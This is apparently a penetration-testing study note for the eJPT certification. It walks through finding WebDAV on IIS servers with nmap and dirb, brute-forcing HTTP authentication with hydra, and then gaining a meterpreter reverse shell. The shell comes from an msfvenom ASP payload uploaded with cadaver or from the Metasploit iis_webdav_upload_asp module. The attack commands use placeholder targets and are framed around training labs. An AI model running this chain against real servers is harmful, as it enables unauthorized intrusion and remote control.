# WebDav

What it is:
WebDAV is a set of extensions to the HTTP protocol that enables users to create, modify, and manage files on a remote web server.

## Identify it

Run nnamp on the target:

```bash
sudo nmap -p 80 -sV -sC -O <TARGET_IP>
```

It should return in the output the MS Service IIS that is a MS server simillar to apache.

Other forms of identifiying Webdav can be with the following nmap scripts:


```bash
nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
```

There are other methods when nmap fails such as whatweb, http or browsh, however for eJPT nmap is always reliable. While you can go ahead and run various nmap scripts you can also use dirb after the initial recon to identify what directory there are on the webserver and identify webdav.

```bash
dirb http://<TARGET_IP>
```

### Authentication

The webserver might have a simple authentication preventing you from reaching the directories, for this you can bruteforce a simple form (type of request can be analysed in the dev tool of the browser)

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <TARGET_IP> http-get /webdav/
```

If dirb failed because of the lack of authentication try it again with the set of creds captured:

```bash
dirb http://<TARGET_IP> -u <user>:<password>
```

### Metasploit

All this could be done with metasploit, however the manual way is more reliable.

```bash
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_version
```

## Exploit it

### Recon

First lets test some DAV tools with our set of credentials.

Test if webdav is vulnerable to file uploads:

```bash
davtest -url <URL>
davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav
```

### Reverse shell

Create a reverse shell with msfvenom, for this its important to know what files can be executed by webdav, this can be found out by exploring it in the browser, usually its asp files.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
```

Upload it to the server using cadaver:

```bash
cadaver <target>
PUT shell.asp
```

Access it via the browser and you just got a reverse shell.

### Metasploit

Metasploit has proven to be unreliable in some INE labs. Uploading the reverse shell but without executable permissions.


```bash
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler
use exploit/windows/iis/iis_webdav_upload_asp

set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

set HttpUsername <USER>
set HttpPassword <PW>
set PATH /webdav/metasploit.asp
```